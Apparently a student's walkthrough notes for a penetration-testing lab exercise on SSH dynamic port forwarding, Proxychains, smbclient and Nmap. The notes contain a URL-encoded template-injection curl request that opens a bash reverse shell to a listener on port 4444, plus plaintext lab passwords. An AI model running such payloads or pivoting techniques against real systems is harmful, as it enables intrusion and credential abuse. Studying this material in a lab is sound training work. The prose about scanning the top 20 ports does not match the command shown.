@@ -1,0 +1,38 @@
+Questions 1
+Follow this walkthrough, and scan HRSHARES from the Kali machine using Nmap and Proxychains. What port between 4800 and 4900 is open?
+
+#Setup MSFConsole to listen port 4444
+curl -v http://192.168.180.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.237/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+
+# Upgrade to fully interactive
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Port Forward 
+ssh -N -D 0.0.0.0:9999 database_admin@10.4.180.215
+password: sqlpass123
+
+# As with the previous example, we don't receive any immediate output after we enter the password. However, this time we will do it through the SOCKS proxy port created by our SSH dynamic port forward command.
+
+# To accomplish this, we'll want to use smbclient again. However, we find that smbclient doesn't natively provide an option to use a SOCKS proxy.3 Without a native option to use a SOCKS proxy in smbclient, we can't take advantage of our dynamic port forward. The SOCKS proxy can't determine how to handle traffic that isn't encapsulated in the SOCKS protocol format.
+
+# To use smbclient in this situation, we'll leverage Proxychains. Proxychains is a tool that can force network traffic from third party tools over HTTP or SOCKS proxies. As the name suggests, it can also be configured to push traffic over a chain of concurrent proxies.
+
+sudo nano /etc/proxychains4.conf
+... # Paste below conf
+socks5 192.168.180.63 9999
+...
+
+# We can use proxychains to execute smbclient
+proxychains smbclient -L //172.16.180.217/ -U hr_admin --password=Welcome1234
+...
+        Scripts         Disk      
+        Users           Disk 
+...
+
+# The connection was a success! We've managed to connect to HRSHARES and list its shares, including an interesting folder called scripts. We receive some extra output from Proxychains too, including the ports that were interacted with while the process was running.
+
+# Let's escalate this and port scan HRSHARES through our SOCKS proxy using Nmap. We'll use a TCP-connect scan (-sT), skip DNS resolution (-n), skip the host discovery stage (-Pn) and only check the top 20 ports (--top-ports=20). We will then prepend proxychains to the command again to push all packets through the SSH dynamic port forward SOCKS proxy. We'll also increase the verbosity using -vvv.
+
+proxychains nmap -vvv -sT -p4800-4900 -Pn 172.24.180.217
+
+
